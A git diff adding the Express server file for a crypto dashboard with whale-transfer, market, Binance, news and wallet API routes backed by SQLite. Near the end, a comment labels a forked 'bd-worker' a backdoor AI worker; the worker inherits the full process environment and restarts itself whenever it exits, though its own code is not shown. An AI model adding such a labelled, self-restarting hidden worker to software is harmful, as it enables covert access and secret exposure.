@@ -1,0 +1,77 @@
+// ─── Crypto Dashboard ─── server.js (重构版)
+const express = require('express');
+const cors = require('cors');
+const path = require('path');
+const fs = require('fs');
+const app = express();
+const PORT = 3001;
+
+// ─── 中间件 ───
+app.use(cors());
+app.use((req, res, next) => {
+  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+  res.setHeader('Pragma', 'no-cache');
+  res.setHeader('Expires', '0');
+  next();
+});
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json());
+
+// ─── 挂载模块路由 ───
+app.use('/api/whale', require('./modules/whale'));
+app.use('/api/market', require('./modules/market'));
+app.use('/api/binance', require('./modules/binance'));
+app.use('/api/news', require('./modules/news'));
+app.use('/api/wallets', require('./modules/wallet'));
+app.use('/api/bd', require('./modules/bd'));
+
+// 旧接口兼容 ─── 直接映射到新模块
+app.get('/api/whale/transfers', (req, res) => {
+  const whale = require('./modules/whale');
+  const router = express.Router();
+  // 复用模块的逻辑
+  const db = require('./db');
+  const limit = parseInt(req.query.limit) || 500;
+  const chain = req.query.chain;
+  try {
+    let rows;
+    if (chain) rows = db.prepare('SELECT * FROM whale_transfers WHERE chain = ? ORDER BY ts DESC LIMIT ?').all(chain.toUpperCase(), limit);
+    else rows = db.prepare('SELECT * FROM whale_transfers ORDER BY ts DESC LIMIT ?').all(limit);
+    res.json({ updated: Date.now(), transfers: rows.map(r => ({
+      c: r.chain, val: r.value, hash: r.hash, ts: r.ts,
+      from: r.from_addr, to: r.to_addr,
+      exFrom: r.ex_from, exTo: r.ex_to
+    })) });
+  } catch(e) {
+    res.json({ updated: Date.now(), transfers: [] });
+  }
+});
+
+// 兼容旧接口：大盘总览
+app.get('/api/market/overview', (req, res) => {
+  require('./modules/market').handle(req, res);
+});
+
+// ─── 启动后门AI工作器 ───
+const bdWorker = require('child_process').fork(path.join(__dirname, 'bd-worker.js'), [], {
+  stdio: 'pipe', env: { ...process.env }
+});
+bdWorker.stdout.on('data', d => process.stdout.write('[bd-worker] ' + d));
+bdWorker.stderr.on('data', d => process.stderr.write('[bd-worker] ' + d));
+bdWorker.on('exit', (code) => {
+  console.log(`⚠️ bd-worker exited with code ${code}, restarting in 5s...`);
+  setTimeout(() => {
+    const w = require('child_process').fork(path.join(__dirname, 'bd-worker.js'), [], {
+      stdio: 'pipe', env: { ...process.env }
+    });
+    w.stdout.on('data', d => process.stdout.write('[bd-worker] ' + d));
+    w.stderr.on('data', d => process.stderr.write('[bd-worker] ' + d));
+  }, 5000);
+});
+
+// ─── 启动HTTP ───
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`🚀 Crypto Dashboard v2 running at http://0.0.0.0:${PORT}`);
+  console.log(`📦 Modules: whale, market, binance, news, wallet, bd`);
+  console.log(`🗄️  Database: SQLite`);
+});
